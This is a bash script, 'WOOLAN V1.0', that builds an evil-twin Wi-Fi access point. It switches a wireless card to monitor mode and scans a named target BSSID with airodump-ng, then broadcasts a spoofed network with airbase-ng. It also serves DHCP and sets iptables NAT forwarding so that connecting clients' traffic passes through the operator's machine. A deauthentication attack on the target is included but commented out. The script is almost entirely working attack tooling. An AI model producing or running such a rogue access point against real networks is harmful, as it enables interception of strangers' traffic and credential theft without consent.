#!/bin/bash

##README BEFORE USE
# You need to install isc dhcp server and aircrack
# --
# apt update
# apt install isc-dhcpd-server aircrack-ng

## -- script

##variables

IP="192.168.2.128" #$1
MASK="255.255.255.128" #$2

##IP Config
ROUTER="192.168.2.129"
BROADCAST="192.168.2.255"
SUBNET_MASK="${MASK}"
DNS="192.168.1.1"
INTERFACE='at0'

##WLAN Config
CHANNEL=11
BSSID_TARGET="D8:FB:5E:E8:5C:7F"
BSSID="AA:AA:AA:AA:AA:AA"
ESSID="ROCIO"
INTERFACE_MONITOR="wlx00c0ca3ebe53" #$3

#RANGE
INIT_IP="192.168.2.130"
END_IP="192.168.2.140"

##SCREEN OPTIONS
SCREEN_NAME_AIRBASE="wlan_screen"
SCREEN_NAME_DHCP="dhcp_screen"

##functions
log() {  echo -e "\e[49m$1\e[0m"; }
log_danger() {  echo -e "\e[31m$1\e[0m"; }
log_info() {  echo -e "\e[34m$1\e[0m"; }
log_warn(){ echo -e "\e[93m$1\e[0m"; }
log_ok(){ echo -e "\e[32m$1\e[0m"; }
log_header(){ echo -e "\n\e[92m\e[1mWOOLAN V1.0 -  \e[0mhttp://mauricio.pe\n-----\n"; }


function exit_process(){ echo -e "Crash..."; fn_exit; }
function ctrl_c() {  echo -e "Exit by user"; fn_exit; }
function error() {   echo -e "\n"; fn_exit; }
trap exit_process SIGINT
trap ctrl_c INT
trap 'error $LINENO' ERR

function fn_exit(){
	killing_all
	log_danger "Exiting applcation...\n";
	exit;
}

function killing_all(){
	applications=( aircrack-ng airodump-ng aireplay-ng airbase-ng dhcpd )
	log_info "Cleanning all..."
	route del -net "${IP}" gw ${ROUTER} netmask ${NETMASK} dev at0 >> /dev/null
	log_info "\nStopping screen..."
	##stop screens
	log_danger "[*] Stopping ${SCREEN_NAME_AIRBASE}"
	screen -ls | grep ${SCREEN_NAME_AIRBASE} | cut -d. -f1 | awk '{print $1}' | xargs kill  &> /dev/null &&

	log_danger "[*] Stopping ${SCREEN_NAME_DHCP}"
	screen -X -S ${SCREEN_NAME_DHCP} quit >> /dev/null &&
	
	log_info "\nKilling applications..."
	for i in ${applications[@]}; do
		if ps -A | grep -q ${i}; then
			killall -s SIGKILL ${i}
			log_danger "[*] ${i} was stopped"
		else log_warn  "[*] ${i} is not running"
		fi
	done


}




##Start application

##cheking requirement
to_exit=0
requirements=( aircrack-ng dhcpd screen)
log "Checking requirements...\n"
for i in ${requirements[@]}; do
	if ! hash ${i} 2>/dev/null; then
		log_danger "[ ] ${i} is not installed "
		to_exit=1
	else log_ok  "[*] ${i} is installed"
	fi
done
echo -e "\n"

if [ "$to_exit" = "1" ]; then
	log "Install all the requirements...\n"
	exit 1
fi
##end cheking requirement

#print header application
log_header

killing_all
echo -e "\n"


#configuration DHCP Server

config_dhcpd="
ddns-update-style none;
authoritative; 
default-lease-time 600;
max-lease-time 7200;
subnet ${IP} netmask ${MASK} {
	option subnet-mask ${SUBNET_MASK};
	option broadcast-address ${BROADCAST};
	option routers ${ROUTER};
	option domain-name-servers 8.8.8.8;
	range ${INIT_IP} ${END_IP};
}"

log_ok "Mode Monitor"
ifconfig ${INTERFACE_MONITOR} down & iwconfig ${INTERFACE_MONITOR} mode monitor & ifconfig ${INTERFACE_MONITOR} up


rm -rf "/tmp/woolan"
mkdir "/tmp/woolan/"

echo "$config_dhcpd" > /etc/dhcp/dhcpd.conf


xterm +j -sb -rightbar -T "Targets" -bg blue -geometry 93x28+0+0  -e bash -c "airodump-ng  ${INTERFACE_MONITOR} -w /tmp/woolan/networks.lst" > /dev/null 2>&1 &


##start airbase on screen
sleep 2
log_ok "[-] Creating airbase screen..."
rm -rf /var/run/dhcpd.pid &&
#screen -d -m -S ${SCREEN_NAME_AIRBASE} 
sleep 1
xterm -geometry 93x28+1200+0 -T "Network Stations" -e bash -c "airodump-ng ${INTERFACE_MONITOR} --bssid ${BSSID} --channel ${CHANNEL}" &
xterm -geometry 93x28+1200+400 -T "Target Stations" -e bash -c "airodump-ng ${INTERFACE_MONITOR} --bssid ${BSSID_TARGET} --channel ${CHANNEL}" &
sleep 1
xterm -geometry 93x28+600+0 -e bash -c "airbase-ng  -I 100 -P -e \"${ESSID}\" -c ${CHANNEL} ${INTERFACE_MONITOR}" &
sleep 4

#deauth#
#xterm -geometry 93x28+0+400 -e bash -c "aireplay-ng -0 0 -a ${BSSID_TARGET}  ${INTERFACE_MONITOR}" &

log_ok "[-] Creating DHCP screen..."
#screen -d -m -S ${SCREEN_NAME_DHCP} 
xterm -e bash -c "/etc/init.d/isc-dhcp-server restart" &


echo "INTERFACESv4='${INTERFACE}'" > /etc/default/isc-dhcp-server 
#echo "INTERFACESv6='${INTERFACE}'" >> /etc/default/isc-dhcp-server 

ifconfig ${INTERFACE} up
ifconfig ${INTERFACE} mtu 1400
ifconfig ${INTERFACE} ${ROUTER} netmask ${MASK}


##add route
route add -net ${IP} netmask ${MASK} gw ${ROUTER}

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables --table nat --append POSTROUTING --out-interface wlp4s0 -j MASQUERADE
iptables --append FORWARD --in-interface ${INTERFACE} -j ACCEPT
iptables-save

echo 1 > /proc/sys/net/ipv4/ip_forward

sysctl -w net.ipv4.ip_forward=1 &> /dev/null


echo -e "\n"
log_ok "WLAN ${ESSID} creado"
echo -e "\n"



cat